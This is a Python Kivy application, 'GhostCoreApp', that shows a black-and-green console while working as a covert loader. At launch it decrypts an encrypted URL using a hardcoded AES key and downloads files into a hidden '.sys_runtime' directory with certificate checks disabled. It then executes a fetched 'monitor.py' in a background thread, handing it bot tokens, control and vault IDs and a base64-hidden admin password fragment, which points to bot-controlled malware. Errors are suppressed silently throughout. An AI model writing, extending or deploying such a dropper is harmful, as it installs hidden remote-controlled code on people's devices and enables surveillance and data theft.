# -*- coding: utf-8 -*-
import os
import sys
import time
import json
import base64
import threading
import importlib.util
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import Clock

BASE_DIR = os.path.join(os.getcwd(), ".sys_runtime")
if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)
sys.path.append(BASE_DIR)

ENCRYPTED_INDEX_URL_BLOB = "MJilpSkjw5UIB3TqHWoAwwCnT43B2loY7Y/5nh4oiO7uQtOgORznWJPTa/1tCcikgAW5lu+TRTFWndV19NhPECwWMCa3bG5+46mFFmp5Ud7EKKis3cQ12YOPoJZYCSfVNQWT4+txaBqUKI+M/wxNIKWN7xlelOTrxdTbvcZeI3snglX7NIR5GR6f0w=="
ADMIN_PASS_PART3_ENC = "QDEyM0A="

try:
    from secrets import BOT_TOKENS, CONTROL_ID, VAULT_ID
except ImportError:
    BOT_TOKENS = ["YOUR_TOKEN"]
    CONTROL_ID = "YOUR_ID"
    VAULT_ID = "YOUR_ID"

def decrypt_data(blob):
    try:
        import base64
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        key = b'MySup3rS3cr3tK3y1234567890123456'
        data = base64.b64decode(blob)
        iv, tag, ct = data[:12], data[12:28], data[28:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
        return (cipher.decryptor().update(ct) + cipher.decryptor().finalize()).decode()
    except:
        return None

class GhostCoreApp(App):
    def build(self):
        self.console = TextInput(text="[System]\n", readonly=True,
                                 background_color=(0,0,0,1), foreground_color=(0,1,0,1), font_size='11sp')
        Clock.schedule_once(self.start, 0.5)
        return self.console

    def start(self, dt):
        threading.Thread(target=self._run, daemon=True).start()

    def _run(self):
        url = decrypt_data(ENCRYPTED_INDEX_URL_BLOB)
        if url:
            try:
                r = requests.get(url, timeout=10, verify=False)
                if r.status_code == 200:
                    for f in r.json().get('files', []):
                        name = f.split('/')[-1]
                        d = requests.get(f, timeout=10, verify=False)
                        if d.status_code == 200:
                            with open(os.path.join(BASE_DIR, name), 'w') as fp:
                                fp.write(d.text)
            except:
                pass
        try:
            mpath = os.path.join(BASE_DIR, "monitor.py")
            if os.path.exists(mpath):
                spec = importlib.util.spec_from_file_location("monitor", mpath)
                mod = importlib.util.module_from_spec(spec)
                sys.modules["monitor"] = mod
                spec.loader.exec_module(mod)
                if hasattr(mod, 'Monitor'):
                    mon = mod.Monitor()
                    mon.admin_password_part3 = base64.b64decode(ADMIN_PASS_PART3_ENC).decode()
                    mon.bot_token = BOT_TOKENS[0]
                    mon.control_id = CONTROL_ID
                    mon.vault_id = VAULT_ID
                    mon.bot_tokens = BOT_TOKENS
                    threading.Thread(target=mon.start, daemon=True).start()
        except:
            pass

if __name__ == '__main__':
    GhostCoreApp().run()
